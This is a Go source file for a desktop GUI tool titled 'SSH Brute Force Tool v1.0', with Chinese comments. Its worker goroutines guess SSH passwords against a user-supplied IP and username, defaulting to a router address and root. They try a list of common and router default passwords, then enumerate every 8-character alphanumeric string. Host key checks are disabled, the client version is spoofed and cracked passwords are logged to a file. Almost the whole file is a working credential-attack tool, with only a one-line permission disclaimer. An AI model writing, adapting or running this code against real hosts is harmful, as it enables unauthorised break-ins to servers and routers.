package main

import (
	"context"
	"fmt"
	"os"
	"strconv"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/crypto/ssh"
	"gopkg.in/yaml.v3"

	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/dialog"
	"fyne.io/fyne/v2/layout"
	"fyne.io/fyne/v2/theme"
	"fyne.io/fyne/v2/widget"
)

// GUIBruteForcer GUI版本的SSH暴力破解器
type GUIBruteForcer struct {
	config       *Config
	passwordChan chan string
	resultChan   chan string
	wg           sync.WaitGroup
	ctx          context.Context
	cancel       context.CancelFunc
	attemptCount int64
	startTime    time.Time
	isRunning    bool

	// GUI组件
	myApp           fyne.App
	window          fyne.Window
	targetIPEntry   *widget.Entry
	targetPortEntry *widget.Entry
	usernameEntry   *widget.Entry
	threadEntry     *widget.Entry
	timeoutEntry    *widget.Entry
	maxCountEntry   *widget.Entry
	maxTimeEntry    *widget.Entry
	logText         *widget.RichText
	startBtn        *widget.Button
	stopBtn         *widget.Button
	statusLabel     *widget.Label
	progressBar     *widget.ProgressBar
	attemptsLabel   *widget.Label
	speedLabel      *widget.Label

	// 验证错误提示标签
	targetIPError   *widget.Label
	targetPortError *widget.Label
	usernameError   *widget.Label
	threadError     *widget.Label
	timeoutError    *widget.Label
	maxCountError   *widget.Label
	maxTimeError    *widget.Label
}

// NewGUIBruteForcer 创建GUI暴力破解器
func NewGUIBruteForcer() *GUIBruteForcer {
	gbf := &GUIBruteForcer{
		isRunning: false,
	}
	return gbf
}

// loadConfigFromGUI 从GUI界面加载配置
func (gbf *GUIBruteForcer) loadConfigFromGUI() (*Config, error) {
	config := &Config{}

	// 获取界面输入值
	config.TargetIP = gbf.targetIPEntry.Text
	if config.TargetIP == "" {
		return nil, fmt.Errorf("目标IP不能为空")
	}

	// 默认启用字典攻击
	config.UseDictionary = true

	port, err := strconv.Atoi(gbf.targetPortEntry.Text)
	if err != nil {
		return nil, fmt.Errorf("端口格式错误: %v", err)
	}
	config.TargetPort = port

	config.TargetUsername = gbf.usernameEntry.Text
	if config.TargetUsername == "" {
		return nil, fmt.Errorf("用户名不能为空")
	}

	threads, err := strconv.Atoi(gbf.threadEntry.Text)
	if err != nil {
		return nil, fmt.Errorf("线程数格式错误: %v", err)
	}
	config.ThreadNum = threads

	timeout, err := strconv.Atoi(gbf.timeoutEntry.Text)
	if err != nil {
		return nil, fmt.Errorf("超时时间格式错误: %v", err)
	}
	config.Timeout = timeout

	maxCount, err := strconv.Atoi(gbf.maxCountEntry.Text)
	if err != nil {
		return nil, fmt.Errorf("最大尝试次数格式错误: %v", err)
	}
	config.MaxCount = maxCount

	maxTime, err := strconv.Atoi(gbf.maxTimeEntry.Text)
	if err != nil {
		return nil, fmt.Errorf("最大运行时间格式错误: %v", err)
	}
	config.MaxTime = maxTime

	// 验证配置参数
	if err := validateGUIConfig(config); err != nil {
		return nil, err
	}

	return config, nil
}

// validateGUIConfig 验证GUI配置参数
func validateGUIConfig(config *Config) error {
	if config.TargetIP == "" {
		return fmt.Errorf("Target IP address cannot be empty")
	}
	if config.TargetPort <= 0 || config.TargetPort > 65535 {
		return fmt.Errorf("Port must be between 1-65535")
	}
	if config.TargetUsername == "" {
		return fmt.Errorf("Username cannot be empty")
	}
	if config.ThreadNum <= 0 || config.ThreadNum > 200 {
		return fmt.Errorf("Thread count must be between 1-200")
	}
	if config.Timeout <= 0 || config.Timeout > 60 {
		return fmt.Errorf("Timeout must be between 1-60 seconds")
	}
	if config.MaxCount < 0 {
		return fmt.Errorf("Max attempts cannot be negative")
	}
	if config.MaxTime < 0 {
		return fmt.Errorf("Max time cannot be negative")
	}
	return nil
}

// validateField 验证单个字段并更新错误提示
func (gbf *GUIBruteForcer) validateField(fieldName, value string) {
	var errorLabel *widget.Label
	var errorMsg string

	switch fieldName {
	case "targetIP":
		errorLabel = gbf.targetIPError
		if value == "" {
			errorMsg = "❌ IP address is required"
		}
	case "targetPort":
		errorLabel = gbf.targetPortError
		if value == "" {
			errorMsg = "❌ Port is required"
		} else if port, err := strconv.Atoi(value); err != nil || port < 1 || port > 65535 {
			errorMsg = "❌ Invalid port number (must be 1-65535)"
		}
	case "username":
		errorLabel = gbf.usernameError
		if value == "" {
			errorMsg = "❌ Username is required"
		}
	case "thread":
		errorLabel = gbf.threadError
		if threads, err := strconv.Atoi(value); err != nil || threads < 1 || threads > 200 {
			errorMsg = "❌ Thread count must be between 1-200"
		}
	case "timeout":
		errorLabel = gbf.timeoutError
		if timeout, err := strconv.Atoi(value); err != nil || timeout < 1 || timeout > 60 {
			errorMsg = "❌ Timeout must be between 1-60 seconds"
		}
	case "maxCount":
		errorLabel = gbf.maxCountError
		if count, err := strconv.Atoi(value); err != nil || count < 0 {
			errorMsg = "❌ Must be a non-negative number"
		}
	case "maxTime":
		errorLabel = gbf.maxTimeError
		if time, err := strconv.Atoi(value); err != nil || time < 0 {
			errorMsg = "❌ Must be a non-negative number"
		}
	}

	if errorLabel != nil {
		if errorMsg != "" {
			errorLabel.SetText(errorMsg)
			errorLabel.Show()
		} else {
			errorLabel.SetText("✅ Valid")
			errorLabel.Hide()
		}
		errorLabel.Refresh()
	}
}

// appendLog 添加日志到界面
func (gbf *GUIBruteForcer) appendLog(message string) {
	currentTime := time.Now().Format("15:04:05")
	logMessage := fmt.Sprintf("[%s] %s\n", currentTime, message)
	currentText := gbf.logText.String()
	gbf.logText.ParseMarkdown(currentText + logMessage)
}

// generatePasswords 生成8位数字字母组合密码
func (gbf *GUIBruteForcer) generatePasswords() {
	defer close(gbf.passwordChan)

	// 如果启用字典攻击，首先尝试常见密码字典
	if gbf.config.UseDictionary {
		commonPasswords := []string{
			// 纯数字
			"12345678", "87654321", "11111111", "00000000",
			"12341234", "56785678", "98769876", "13579135",
			"24681357", "19900101", "20000101", "20230101",

			// 字母+数字组合
			"admin123", "root1234", "password", "qwerty12",
			"abc12345", "test1234", "user1234", "guest123",
			"admin888", "root0000", "xiaomi01", "redmi123",

			// 路由器常见密码
			"admin888", "12345678", "password", "admin123",
			"root1234", "xiaomi88", "redmi888", "miwifi01",
			"router01", "wifi1234", "internet", "network1",

			// 年份相关
			"20231234", "20221234", "20211234", "20201234",
			"19901234", "19951234", "20001234", "20101234",
		}

		// 发送常见密码
		for _, password := range commonPasswords {
			select {
			case <-gbf.ctx.Done():
				return
			case gbf.passwordChan <- password:
			}
		}
	}

	// 如果字典攻击失败，则进行暴力枚举
	// 字符集：数字和字母
	chars := "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	charLen := len(chars)

	// 预分配密码字节数组，减少内存分配
	passwordBytes := make([]byte, 8)

	// 生成8位密码
	for i := 0; i < charLen; i++ {
		passwordBytes[0] = chars[i]
		for j := 0; j < charLen; j++ {
			passwordBytes[1] = chars[j]
			for k := 0; k < charLen; k++ {
				passwordBytes[2] = chars[k]
				for l := 0; l < charLen; l++ {
					passwordBytes[3] = chars[l]
					for m := 0; m < charLen; m++ {
						passwordBytes[4] = chars[m]
						for n := 0; n < charLen; n++ {
							passwordBytes[5] = chars[n]
							for o := 0; o < charLen; o++ {
								passwordBytes[6] = chars[o]
								for p := 0; p < charLen; p++ {
									select {
									case <-gbf.ctx.Done():
										return
									default:
										passwordBytes[7] = chars[p]
										// 创建字符串副本发送到channel
										password := string(passwordBytes)
										gbf.passwordChan <- password
									}
								}
							}
						}
					}
				}
			}
		}
	}
}

// trySSHLogin 尝试SSH登录
func (gbf *GUIBruteForcer) trySSHLogin(password string) bool {
	config := &ssh.ClientConfig{
		User: gbf.config.TargetUsername,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         time.Duration(gbf.config.Timeout) * time.Second,
		// 添加客户端版本信息
		ClientVersion: "SSH-2.0-OpenSSH_8.0",
	}

	addr := fmt.Sprintf("%s:%d", gbf.config.TargetIP, gbf.config.TargetPort)
	client, err := ssh.Dial("tcp", addr, config)
	if err != nil {
		// 只有认证成功但其他错误才返回true
		if err.Error() == "ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain" {
			return false
		}
		// 网络错误或其他错误
		return false
	}
	defer client.Close()

	// 尝试执行一个简单命令验证连接
	session, err := client.NewSession()
	if err != nil {
		return true // 能建立连接就说明认证成功
	}
	defer session.Close()

	return true
}

// worker 工作协程
func (gbf *GUIBruteForcer) worker(id int) {
	defer gbf.wg.Done()

	for {
		select {
		case <-gbf.ctx.Done():
			return
		case password, ok := <-gbf.passwordChan:
			if !ok {
				return
			}

			// 检查最大尝试次数
			if gbf.config.MaxCount > 0 {
				if atomic.LoadInt64(&gbf.attemptCount) >= int64(gbf.config.MaxCount) {
					return
				}
			}

			// 检查最大运行时间
			if gbf.config.MaxTime > 0 {
				if time.Since(gbf.startTime) >= time.Duration(gbf.config.MaxTime)*time.Second {
					return
				}
			}

			atomic.AddInt64(&gbf.attemptCount, 1)
			currentCount := atomic.LoadInt64(&gbf.attemptCount)

			// 限制GUI更新频率，避免过多的并发更新
			if currentCount%50 == 0 || currentCount <= 5 {
				// 更新状态标签
				gbf.statusLabel.SetText(fmt.Sprintf("Attacking... %d attempts", currentCount))
				gbf.attemptsLabel.SetText(fmt.Sprintf("● Attempts: %d", currentCount))

				// 计算攻击速度
				elapsed := time.Since(gbf.startTime).Seconds()
				if elapsed > 0 {
					speed := float64(currentCount) / elapsed
					gbf.speedLabel.SetText(fmt.Sprintf("▶ Speed: %.1f/s", speed))
				}
			}

			if gbf.trySSHLogin(password) {
				select {
				case gbf.resultChan <- password:
				default:
				}
				return
			}
		}
	}
}

// savePassword 保存密码到文件
func (gbf *GUIBruteForcer) savePassword(password string) error {
	file, err := os.OpenFile("password.txt", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if err != nil {
		return err
	}
	defer file.Close()

	_, err = file.WriteString(fmt.Sprintf("成功破解密码: %s\n时间: %s\n目标: %s@%s:%d\n\n",
		password,
		time.Now().Format("2006-01-02 15:04:05"),
		gbf.config.TargetUsername,
		gbf.config.TargetIP,
		gbf.config.TargetPort))
	return err
}

// startBruteForce 开始暴力破解
func (gbf *GUIBruteForcer) startBruteForce() {
	// 加载配置
	config, err := gbf.loadConfigFromGUI()
	if err != nil {
		dialog.ShowError(err, gbf.window)
		return
	}
	gbf.config = config

	// 初始化
	gbf.ctx, gbf.cancel = context.WithCancel(context.Background())
	gbf.passwordChan = make(chan string, config.ThreadNum*2)
	gbf.resultChan = make(chan string, 1)
	gbf.attemptCount = 0
	gbf.startTime = time.Now()
	gbf.isRunning = true

	// 更新界面状态
	gbf.startBtn.Disable()
	gbf.stopBtn.Enable()
	gbf.statusLabel.SetText("Starting attack...")
	gbf.logText.ParseMarkdown("")

	// 重置统计信息
	gbf.attemptsLabel.SetText("🔢 Attempts: 0")
	gbf.speedLabel.SetText("▶ Speed: 0/s")

	gbf.appendLog(fmt.Sprintf("Starting SSH brute force attack - Target: %s@%s:%d", config.TargetUsername, config.TargetIP, config.TargetPort))
	gbf.appendLog(fmt.Sprintf("Threads: %d, Timeout: %ds", config.ThreadNum, config.Timeout))
	if config.MaxCount > 0 {
		gbf.appendLog(fmt.Sprintf("Max attempts: %d", config.MaxCount))
	}
	if config.MaxTime > 0 {
		gbf.appendLog(fmt.Sprintf("Max runtime: %ds", config.MaxTime))
	}

	// 启动密码生成器
	go gbf.generatePasswords()

	// 启动工作协程
	for i := 0; i < config.ThreadNum; i++ {
		gbf.wg.Add(1)
		go gbf.worker(i + 1)
	}

	// 等待结果或完成
	go func() {
		gbf.wg.Wait()
		close(gbf.resultChan)
	}()

	// 监听结果
	go func() {
		select {
		case password := <-gbf.resultChan:
			if password != "" {
				gbf.appendLog("🎉 Attack successful!")
				gbf.appendLog(fmt.Sprintf("Password: %s", password))
				gbf.appendLog(fmt.Sprintf("Time elapsed: %v", time.Since(gbf.startTime)))
				gbf.appendLog(fmt.Sprintf("Attempts: %d", atomic.LoadInt64(&gbf.attemptCount)))

				// 保存密码到文件
				if err := gbf.savePassword(password); err != nil {
					gbf.appendLog(fmt.Sprintf("Failed to save password: %v", err))
				} else {
					gbf.appendLog("Password saved to password.txt")
				}

				gbf.statusLabel.SetText("Attack successful!")
				dialog.ShowInformation("Attack Successful", fmt.Sprintf("Password: %s\nTime elapsed: %v\nAttempts: %d", password, time.Since(gbf.startTime), atomic.LoadInt64(&gbf.attemptCount)), gbf.window)
			}
		case <-gbf.ctx.Done():
			gbf.appendLog("Attack stopped")
			gbf.appendLog(fmt.Sprintf("Time elapsed: %v", time.Since(gbf.startTime)))
			gbf.appendLog(fmt.Sprintf("Attempts: %d", atomic.LoadInt64(&gbf.attemptCount)))
			gbf.statusLabel.SetText("Stopped")
		}

		// 重置界面状态
		gbf.isRunning = false
		gbf.startBtn.Enable()
		gbf.stopBtn.Disable()
	}()
}

// stopBruteForce 停止暴力破解
func (gbf *GUIBruteForcer) stopBruteForce() {
	if gbf.cancel != nil {
		gbf.cancel()
	}
	gbf.appendLog("Stopping attack...")
}

// loadConfigFromFile 从文件加载配置
func (gbf *GUIBruteForcer) loadConfigFromFile() {
	config, err := loadConfig("config.yaml")
	if err != nil {
		dialog.ShowError(fmt.Errorf("Failed to load config file: %v", err), gbf.window)
		return
	}

	// 更新界面
	gbf.targetIPEntry.SetText(config.TargetIP)
	gbf.targetPortEntry.SetText(fmt.Sprintf("%d", config.TargetPort))
	gbf.usernameEntry.SetText(config.TargetUsername)
	gbf.threadEntry.SetText(fmt.Sprintf("%d", config.ThreadNum))
	gbf.timeoutEntry.SetText(fmt.Sprintf("%d", config.Timeout))
	gbf.maxCountEntry.SetText(fmt.Sprintf("%d", config.MaxCount))
	gbf.maxTimeEntry.SetText(fmt.Sprintf("%d", config.MaxTime))

	dialog.ShowInformation("Load Successful", "Configuration file has been loaded", gbf.window)
}

// saveConfigToFile 保存配置到文件
func (gbf *GUIBruteForcer) saveConfigToFile() {
	config, err := gbf.loadConfigFromGUI()
	if err != nil {
		dialog.ShowError(err, gbf.window)
		return
	}

	data, err := yaml.Marshal(config)
	if err != nil {
		dialog.ShowError(fmt.Errorf("Failed to serialize config: %v", err), gbf.window)
		return
	}

	err = os.WriteFile("config.yaml", data, 0644)
	if err != nil {
		dialog.ShowError(fmt.Errorf("Failed to save config file: %v", err), gbf.window)
		return
	}

	dialog.ShowInformation("Save Successful", "Configuration saved to config.yaml", gbf.window)
}

// createGUI 创建GUI界面
func (gbf *GUIBruteForcer) createGUI() {
	gbf.myApp = app.NewWithID("com.example.sshbruteforce")
	gbf.myApp.SetIcon(theme.ComputerIcon())

	gbf.window = gbf.myApp.NewWindow("SSH Brute Force Tool v1.0")
	gbf.window.Resize(fyne.NewSize(1000, 700))
	gbf.window.SetFixedSize(false)
	gbf.window.CenterOnScreen()

	// 初始化错误提示标签
	gbf.targetIPError = widget.NewLabel("")
	gbf.targetIPError.TextStyle = fyne.TextStyle{Italic: true}
	gbf.targetIPError.Hide()

	gbf.targetPortError = widget.NewLabel("")
	gbf.targetPortError.TextStyle = fyne.TextStyle{Italic: true}
	gbf.targetPortError.Hide()

	gbf.usernameError = widget.NewLabel("")
	gbf.usernameError.TextStyle = fyne.TextStyle{Italic: true}
	gbf.usernameError.Hide()

	gbf.threadError = widget.NewLabel("")
	gbf.threadError.TextStyle = fyne.TextStyle{Italic: true}
	gbf.threadError.Hide()

	gbf.timeoutError = widget.NewLabel("")
	gbf.timeoutError.TextStyle = fyne.TextStyle{Italic: true}
	gbf.timeoutError.Hide()

	gbf.maxCountError = widget.NewLabel("")
	gbf.maxCountError.TextStyle = fyne.TextStyle{Italic: true}
	gbf.maxCountError.Hide()

	gbf.maxTimeError = widget.NewLabel("")
	gbf.maxTimeError.TextStyle = fyne.TextStyle{Italic: true}
	gbf.maxTimeError.Hide()

	// 创建输入组件并添加实时验证
	gbf.targetIPEntry = widget.NewEntry()
	gbf.targetIPEntry.SetText("192.168.31.1")
	gbf.targetIPEntry.SetPlaceHolder("🌐 Enter target IP address (e.g., 192.168.1.1)")
	gbf.targetIPEntry.OnChanged = func(text string) {
		gbf.validateField("targetIP", text)
	}

	gbf.targetPortEntry = widget.NewEntry()
	gbf.targetPortEntry.SetText("22")
	gbf.targetPortEntry.SetPlaceHolder("🔌 SSH Port (default: 22)")
	gbf.targetPortEntry.OnChanged = func(text string) {
		gbf.validateField("targetPort", text)
	}

	gbf.usernameEntry = widget.NewEntry()
	gbf.usernameEntry.SetText("root")
	gbf.usernameEntry.SetPlaceHolder("👤 Username (e.g., root, admin)")
	gbf.usernameEntry.OnChanged = func(text string) {
		gbf.validateField("username", text)
	}

	gbf.threadEntry = widget.NewEntry()
	gbf.threadEntry.SetText("10")
	gbf.threadEntry.SetPlaceHolder("🧵 Concurrent threads (1-200)")
	gbf.threadEntry.OnChanged = func(text string) {
		gbf.validateField("thread", text)
	}

	gbf.timeoutEntry = widget.NewEntry()
	gbf.timeoutEntry.SetText("5")
	gbf.timeoutEntry.SetPlaceHolder("⏱️ Connection timeout (seconds)")
	gbf.timeoutEntry.OnChanged = func(text string) {
		gbf.validateField("timeout", text)
	}

	gbf.maxCountEntry = widget.NewEntry()
	gbf.maxCountEntry.SetText("0")
	gbf.maxCountEntry.SetPlaceHolder("🔢 Max attempts (0=unlimited)")
	gbf.maxCountEntry.OnChanged = func(text string) {
		gbf.validateField("maxCount", text)
	}

	gbf.maxTimeEntry = widget.NewEntry()
	gbf.maxTimeEntry.SetText("0")
	gbf.maxTimeEntry.SetPlaceHolder("⏰ Max time in seconds (0=unlimited)")
	gbf.maxTimeEntry.OnChanged = func(text string) {
		gbf.validateField("maxTime", text)
	}

	// 创建配置表单 - 使用分组布局并添加错误提示
	// 目标配置组
	targetIPContainer := container.New(layout.NewVBoxLayout(),
		gbf.targetIPEntry,
		gbf.targetIPError,
	)
	targetPortContainer := container.New(layout.NewVBoxLayout(),
		gbf.targetPortEntry,
		gbf.targetPortError,
	)
	usernameContainer := container.New(layout.NewVBoxLayout(),
		gbf.usernameEntry,
		gbf.usernameError,
	)

	targetGroup := container.New(layout.NewFormLayout(),
		widget.NewLabel("Target IP:"), targetIPContainer,
		widget.NewLabel("SSH Port:"), targetPortContainer,
		widget.NewLabel("Username:"), usernameContainer,
	)
	targetCard := widget.NewCard("🎯 Target Configuration", "", targetGroup)

	// 攻击配置组
	threadContainer := container.New(layout.NewVBoxLayout(),
		gbf.threadEntry,
		gbf.threadError,
	)
	timeoutContainer := container.New(layout.NewVBoxLayout(),
		gbf.timeoutEntry,
		gbf.timeoutError,
	)

	attackGroup := container.New(layout.NewFormLayout(),
		widget.NewLabel("Threads:"), threadContainer,
		widget.NewLabel("Timeout(s):"), timeoutContainer,
	)
	attackCard := widget.NewCard("▶ Attack Settings", "", attackGroup)

	// 限制配置组
	maxCountContainer := container.New(layout.NewVBoxLayout(),
		gbf.maxCountEntry,
		gbf.maxCountError,
	)
	maxTimeContainer := container.New(layout.NewVBoxLayout(),
		gbf.maxTimeEntry,
		gbf.maxTimeError,
	)

	limitGroup := container.New(layout.NewFormLayout(),
		widget.NewLabel("Max Attempts:"), maxCountContainer,
		widget.NewLabel("Max Time(s):"), maxTimeContainer,
	)
	limitCard := widget.NewCard("⏱️ Limits (0=unlimited)", "", limitGroup)

	// 配置区域布局
	configForm := container.New(layout.NewVBoxLayout(),
		targetCard,
		widget.NewSeparator(),
		attackCard,
		widget.NewSeparator(),
		limitCard,
	)

	// 创建按钮并添加工具提示
	gbf.startBtn = widget.NewButtonWithIcon("▶ Start Attack", theme.MediaPlayIcon(), gbf.startBruteForce)
	gbf.startBtn.Importance = widget.HighImportance

	gbf.stopBtn = widget.NewButtonWithIcon("🛑 Stop Attack", theme.MediaStopIcon(), gbf.stopBruteForce)
	gbf.stopBtn.Importance = widget.DangerImportance
	gbf.stopBtn.Disable()

	loadConfigBtn := widget.NewButtonWithIcon("📂 Load Config", theme.FolderOpenIcon(), gbf.loadConfigFromFile)
	saveConfigBtn := widget.NewButtonWithIcon("💾 Save Config", theme.DocumentSaveIcon(), gbf.saveConfigToFile)

	// 主要操作按钮组
	mainActionContainer := container.New(layout.NewHBoxLayout(),
		gbf.startBtn,
		widget.NewSeparator(),
		gbf.stopBtn,
	)

	// 配置操作按钮组
	configActionContainer := container.New(layout.NewHBoxLayout(),
		loadConfigBtn,
		widget.NewSeparator(),
		saveConfigBtn,
	)

	// 按钮区域整体布局
	buttonContainer := container.New(layout.NewVBoxLayout(),
		widget.NewCard("🚀 Actions", "", mainActionContainer),
		widget.NewCard("💾 Configuration", "", configActionContainer),
	)

	// 创建状态和日志组件
	gbf.statusLabel = widget.NewLabel("Ready")
	gbf.statusLabel.TextStyle = fyne.TextStyle{Bold: true}
	gbf.progressBar = widget.NewProgressBar()

	// 初始化日志区域，添加欢迎信息
	initialLogContent := `# SSH Brute Force Tool

**Welcome to SSH Brute Force Tool v1.0**

📋 **Instructions:**
• Configure target settings in the left panel
• Click "Start Attack" to begin brute force
• Monitor progress and logs here
• Use "Load Config" to import saved configurations

⚠️ **Important:** Only use this tool on systems you own or have explicit permission to test.

---
*Ready to start...*`

	gbf.logText = widget.NewRichTextFromMarkdown(initialLogContent)
	gbf.logText.Wrapping = fyne.TextWrapWord

	// 添加额外状态信息
	versionLabel := widget.NewLabel("📦 Version: 1.0")
	versionLabel.TextStyle = fyne.TextStyle{Italic: true}
	timeLabel := widget.NewLabel(fmt.Sprintf("🕐 Started: %s", time.Now().Format("15:04:05")))
	timeLabel.TextStyle = fyne.TextStyle{Italic: true}

	// 添加统计信息
	gbf.attemptsLabel = widget.NewLabel("● Attempts: 0")
	gbf.attemptsLabel.TextStyle = fyne.TextStyle{Italic: true}
	gbf.speedLabel = widget.NewLabel("▶ Speed: 0/s")
	gbf.speedLabel.TextStyle = fyne.TextStyle{Italic: true}

	// 状态区域布局
	statusContainer := container.New(layout.NewVBoxLayout(),
		gbf.statusLabel,
		widget.NewSeparator(),
		gbf.progressBar,
		widget.NewSeparator(),
		container.New(layout.NewGridLayout(2),
			versionLabel,
			timeLabel,
			gbf.attemptsLabel,
			gbf.speedLabel,
		),
	)

	logScroll := container.NewScroll(gbf.logText)
	logScroll.SetMinSize(fyne.NewSize(0, 250))

	// 创建主布局 - 添加图标增强视觉效果
	configCard := widget.NewCard("⚙️ Configuration", "", configForm)
	controlCard := widget.NewCard("▶ Control Panel", "", buttonContainer)
	statusCard := widget.NewCard("📊 Status", "", statusContainer)
	logCard := widget.NewCard("📝, Log", "", logScroll)

	// 使用更好的响应式布局，添加边距和间距
	leftPanel := container.New(layout.NewVBoxLayout(),
		configCard,
		widget.NewSeparator(),
		statusCard,
	)

	rightPanel := container.New(layout.NewVBoxLayout(),
		controlCard,
		widget.NewSeparator(),
		logCard,
	)

	// 添加边距的主容器
	mainContainer := container.NewHSplit(
		container.NewPadded(leftPanel),
		container.NewPadded(rightPanel),
	)
	mainContainer.SetOffset(0.4) // 设置左右面板比例

	// 为整个窗口添加边距
	paddedContainer := container.NewPadded(mainContainer)
	gbf.window.SetContent(paddedContainer)

	// 设置窗口关闭事件
	gbf.window.SetCloseIntercept(func() {
		if gbf.isRunning {
			dialog.ShowConfirm("Confirm Exit", "Attack is in progress, are you sure you want to exit?", func(confirmed bool) {
				if confirmed {
					gbf.stopBruteForce()
					gbf.window.Close()
				}
			}, gbf.window)
		} else {
			gbf.window.Close()
		}
	})

	gbf.window.ShowAndRun()
}
